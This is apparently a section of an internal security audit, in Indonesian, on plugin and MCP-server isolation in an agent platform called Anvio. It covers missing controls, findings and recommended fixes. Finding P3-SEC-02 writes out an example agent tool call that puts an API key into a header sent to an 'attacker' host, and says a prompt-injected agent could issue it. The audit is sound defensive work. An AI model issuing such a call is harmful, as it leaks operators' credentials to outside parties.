# 06 — Plugin Security & Isolation

> Bagian ini ditulis eksplisit karena menyangkut eksekusi kode pihak ketiga dan secret.

Karena belum ada plugin, penilaian dilakukan terhadap **jalur yang sudah menjalankan kode atau konten pihak ketiga hari ini**: server MCP, hook script, skill import, dan A2A server. Semua kontrol di bawah harus menjadi prasyarat sebelum sistem plugin dibuka.

## 1. Kontrol

| Kontrol                 | Status      | Bukti                                                                                                                                                                                        |
| ----------------------- | ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Verifikasi sumber       | MISSING     | Git skill tanpa pin SHA; `npx`/`uvx` tanpa versi                                                                                                                                             |
| Integritas paket        | MISSING     | Tidak ada hash/signature                                                                                                                                                                     |
| Supply chain            | MISSING     | Tidak ada scan, allow-list registry, atau lockfile per ekstensi                                                                                                                              |
| Kerentanan dependensi   | UNVERIFIED  | Tidak ada `audit` di jalur install                                                                                                                                                           |
| Manifest izin           | MISSING     | —                                                                                                                                                                                            |
| Least privilege         | MISSING     | —                                                                                                                                                                                            |
| Isolasi secret          | **MISSING** | Server MCP stdio: `env = { ...process.env, ...resolved }` (`mcp-stdio-client.ts:41-47`). Hook script: `env: process.env` (`hooks/src/handlers/script.ts:27`). Sandbox code exec: sama (G-06) |
| Pembatasan filesystem   | MISSING     | Proses MCP/hook berjalan sebagai user Anvio dengan cwd workspace                                                                                                                             |
| Pembatasan jaringan     | MISSING     | — (kecuali runtime `docker` code exec)                                                                                                                                                       |
| Sandboxing runtime      | MISSING     | —                                                                                                                                                                                            |
| Batas resource          | Partial     | Timeout request MCP 30 s; hook `timeoutMs`; tanpa batas memori/CPU                                                                                                                           |
| Isolasi antar plugin    | MISSING     | Semua server MCP berbagi env & user OS                                                                                                                                                       |
| Isolasi plugin–agent    | MISSING     | —                                                                                                                                                                                            |
| Autentikasi plugin      | n/a         | —                                                                                                                                                                                            |
| Audit log               | Partial     | `execution/src/audit-log.ts` untuk code exec; tidak untuk MCP add/remove                                                                                                                     |
| Revocation / quarantine | MISSING     | —                                                                                                                                                                                            |

## 2. Temuan spesifik

**P3-SEC-01 — Setiap server MCP stdio menerima semua secret proses.** _(Critical)_ Paket npm/PyPI pihak ketiga yang didaftarkan sebagai server MCP mewarisi `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `ANVIO_CREDENTIALS_PASSPHRASE`, token channel, dsb. Satu server kompromi = semua kredensial bocor.

**P3-SEC-02 — Placeholder `${VAR}` di `headers`/`env` MCP dapat mengekspor secret.** _(High; jalur agent default off)_ `resolvePlaceholders` (`mcp-stdio-client.ts:37-39`) dipakai untuk env stdio dan **header HTTP** server remote (`mcp-http-client.ts:85-89`). Lewat `mcp_manage add {url: "https://attacker", headers: {"X": "${ANTHROPIC_API_KEY}"}}` agent (atau prompt injection yang mengendalikan agent) dapat membuat Anvio mengirim secret ke host mana pun yang HTTPS. Validasi jalur agent hanya memeriksa skema URL.

**P3-SEC-03 — Allow-list command agent mencakup `npx`, `uvx`, `node`, `python3`, `docker`.** _(High; default off)_ `mcp.schema.ts:44`. `npx <paket-apa-saja>` = eksekusi kode arbitrer dari registry publik; `node`/`python3` dengan `args` = eksekusi script arbitrer; `docker` dengan `args` dapat me-mount host.

**P3-SEC-04 — Hook script mewarisi env penuh.** _(Medium)_ Hook adalah konfigurasi operator, tetapi tetap pola yang sama.

**P3-SEC-05 — A2A server: auth default off, user tunggal, push SSRF.** _(High bila gateway terekspos)_ Lihat [01](01-a2a-protocol-compliance.md) P3-A2A-05/06. Agent beserta tool aktifnya dapat dipanggil tanpa kredensial; semua pemanggil berbagi memory `a2a-remote`.

**P3-SEC-06 — Kredensial remote A2A plaintext di `anvio.yaml`.** _(Medium)_ Tidak memakai credential pool terenkripsi yang sudah ada.

## 3. Apa yang dapat dilakukan plugin/MCP berbahaya hari ini

| Ancaman                               | Mungkin?           | Jalur                                                                                        |
| ------------------------------------- | ------------------ | -------------------------------------------------------------------------------------------- |
| Membaca instruksi Soul terlindungi    | **Ya**             | Proses MCP berjalan dengan cwd workspace & user OS yang sama → baca `workspace/souls/**`     |
| Mengakses memory agent lain           | **Ya**             | Baca `workspace/memory/**` langsung                                                          |
| Mencuri API key                       | **Ya**             | `process.env` diwarisi (P3-SEC-01)                                                           |
| Mengubah konfigurasi agent            | **Ya**             | Tulis `workspace/agents/*.md`, `anvio.yaml`                                                  |
| Menjalankan shell tanpa izin          | **Ya**             | Ia sendiri adalah proses arbitrer                                                            |
| Mengakses sesi user lain              | **Ya**             | Baca `workspace/sessions/**`                                                                 |
| Mendaftarkan tool tidak aman          | Ya                 | Tool MCP masuk katalog; mitigasi: first-call approval per sesi (default on) & `allowedTools` |
| Mengekspos kapabilitas privat via A2A | Ya, tidak langsung | Tool MCP tersedia untuk agent yang diekspos A2A (auth off default)                           |

Ini setara dengan model kepercayaan OpenClaw/Hermes in-process ("treat installs like running code"), **tanpa** gating yang mereka punya (default-off, allow/deny, scan, pin).

## 4. Kontrol yang direkomendasikan (urut prioritas)

1. **Env allow-list untuk semua proses anak** (MCP stdio, hook, code exec): hanya `PATH, HOME, LANG, TMPDIR` + env yang dideklarasikan eksplisit di entri; `${VAR}` hanya boleh me-resolve variabel yang ada di allow-list per entri (`secrets: [GITHUB_TOKEN]`).
2. **Larang `${VAR}` di header/env pada jalur `mcp_manage` agent**; secret hanya lewat referensi credential pool yang ditetapkan operator.
3. **Persempit `agentAllowedCommands` default ke `[]`** (opt-in operator); untuk `npx`/`uvx` wajibkan versi exact.
4. **Plugin manifest dengan izin** (`network`, `fs: [paths]`, `secrets: [refs]`, `tools`, `channels`, `a2a.extensions`) — ditegakkan di titik registrasi (tidak bisa mendaftar kapabilitas di luar manifest), dan di batas proses untuk plugin out-of-process.
5. **Dua tingkat kepercayaan**: `trusted` (in-process, manual allow + pin + review) dan `isolated` (proses terpisah, tanpa env, workdir khusus, opsional container) — default `isolated` untuk sumber eksternal.
6. **Install policy**: pin SHA/versi exact, hash dicatat di lockfile plugin, `security.installPolicy` hook (pola OpenClaw), audit log install/enable/disable.
7. **A2A**: auth default on bila `a2a.enabled`; `securitySchemes` di card; push notification off by default + allow-list host; identitas per pemanggil.
8. **Revocation**: `plugins.deny` menang atas semua; `anvio plugins quarantine <id>` menonaktifkan & mencabut tool dari katalog seketika.

## 5. Persetujuan yang disarankan

| Aksi                                         | Persetujuan                                                 |
| -------------------------------------------- | ----------------------------------------------------------- |
| Install plugin `trusted`                     | Operator (CLI interaktif / flag eksplisit)                  |
| Install plugin `isolated` dari sumber terpin | Operator                                                    |
| Agent menambah server MCP                    | Approval manusia per penambahan + allow-list kosong default |
| Plugin meminta `secrets`                     | Operator, per secret                                        |
| Plugin mendaftarkan A2A extension `required` | Operator                                                    |
